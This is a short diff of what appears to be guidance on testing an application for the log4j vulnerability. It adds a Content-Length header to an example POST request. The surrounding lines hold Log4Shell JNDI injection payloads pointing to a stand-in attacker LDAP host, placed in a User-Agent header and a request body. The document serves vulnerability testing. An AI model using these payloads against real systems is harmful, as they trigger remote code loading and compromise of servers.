@@ -65,6 +65,7 @@ In order to test for log4j vulnerabilities in this application, the payload must
 User-Agent: ${jndi:ldap://attack.er/path}
 
 /POST
-(body part)
+Content-Length: (length)
+
 payload=${jndi:ldap://attack.er/path}
 ```
